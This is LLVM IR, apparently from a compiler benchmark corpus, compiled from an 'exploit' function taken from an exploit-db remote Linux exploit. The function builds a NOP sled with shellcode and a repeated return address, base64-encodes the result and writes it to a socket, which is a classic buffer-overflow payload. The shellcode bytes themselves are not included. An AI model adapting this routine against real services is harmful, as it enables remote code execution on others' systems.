; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_812.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_812.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NOP = common dso_local global i32 0, align 4
@sc = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2000 x i8], align 16
  %6 = alloca [2668 x i8], align 16
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %9 = getelementptr inbounds [2000 x i8], [2000 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* @NOP, align 4
  %11 = call i32 @memset(i8* %9, i32 %10, i32 1000)
  %12 = getelementptr inbounds [2000 x i8], [2000 x i8]* %5, i64 0, i64 1000
  %13 = load i32, i32* @sc, align 4
  %14 = call i32 @strlen(i32 %13)
  %15 = sext i32 %14 to i64
  %16 = sub i64 0, %15
  %17 = getelementptr inbounds i8, i8* %12, i64 %16
  %18 = load i32, i32* @sc, align 4
  %19 = load i32, i32* @sc, align 4
  %20 = call i32 @strlen(i32 %19)
  %21 = call i32 @memcpy(i8* %17, i32 %18, i32 %20)
  %22 = getelementptr inbounds [2000 x i8], [2000 x i8]* %5, i64 0, i64 1000
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %7, align 8
  store i32 0, i32* %8, align 4
  br label %24

24:                                               ; preds = %31, %2
  %25 = load i32, i32* %8, align 4
  %26 = icmp slt i32 %25, 1000
  br i1 %26, label %27, label %34

27:                                               ; preds = %24
  %28 = load i32, i32* %4, align 4
  %29 = load i32*, i32** %7, align 8
  %30 = getelementptr inbounds i32, i32* %29, i32 1
  store i32* %30, i32** %7, align 8
  store i32 %28, i32* %29, align 4
  br label %31

31:                                               ; preds = %27
  %32 = load i32, i32* %8, align 4
  %33 = add nsw i32 %32, 4
  store i32 %33, i32* %8, align 4
  br label %24

34:                                               ; preds = %24
  %35 = getelementptr inbounds [2668 x i8], [2668 x i8]* %6, i64 0, i64 0
  %36 = getelementptr inbounds [2000 x i8], [2000 x i8]* %5, i64 0, i64 0
  %37 = call i32 @spa_bits_to_base64(i8* %35, i8* %36, i32 2000)
  %38 = load i32, i32* %3, align 4
  %39 = getelementptr inbounds [2668 x i8], [2668 x i8]* %6, i64 0, i64 0
  %40 = call i32 @write(i32 %38, i8* %39, i32 2668)
  %41 = load i32, i32* %3, align 4
  %42 = call i32 @write(i32 %41, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 1)
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @spa_bits_to_base64(i8*, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
